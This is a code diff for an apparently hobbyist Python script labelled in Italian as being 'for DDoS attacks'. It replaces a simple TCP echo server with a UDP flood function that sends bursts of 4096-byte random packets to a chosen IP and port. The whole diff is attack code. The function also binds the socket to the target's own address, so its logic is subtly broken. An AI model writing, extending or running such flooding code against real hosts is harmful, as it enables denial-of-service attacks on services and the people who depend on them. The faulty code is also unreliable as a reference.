@@ -8,20 +8,28 @@ per attacchi ddos
 
 
 import socket
+import random
 
 
-HOST = "127.0.0.1"
-PORT = 65432
+def udp_flood_v1(indirizzo_ip, numero_porta, numero_pacchetti):
+    """ Creazione di un udp flood """
+    data_to_send = random._urandom(4096)
+    try:
+        my_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    except ConnectionError as error:
+        print(error)
+    except OSError:
+        print("Non posso creare un socket ad un ip che non ho.")
+    else:
+        target = (indirizzo_ip, numero_porta)
+        my_socket.bind((indirizzo_ip, numero_porta))
+        print(f"Il target selezionato è: {target}")
+        for x in range(0, numero_pacchetti):
+            my_socket.sendto(data_to_send, target)
+            print(f"N:{x} - UDP inviati")
+        my_socket.close()
+
+        return indirizzo_ip, numero_porta, numero_pacchetti
 
 
-with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-    s.bind((HOST, PORT))
-    s.listen(5)
-    conn,addr = s.accept()
-    with conn:
-        print(f"Connected by {addr}")
-        while True:
-            data = conn.recv(1024)
-            if not data:
-                break
-            conn.sendall(data)
+udp_flood_v1("127.0.0.1", 5555, 5)
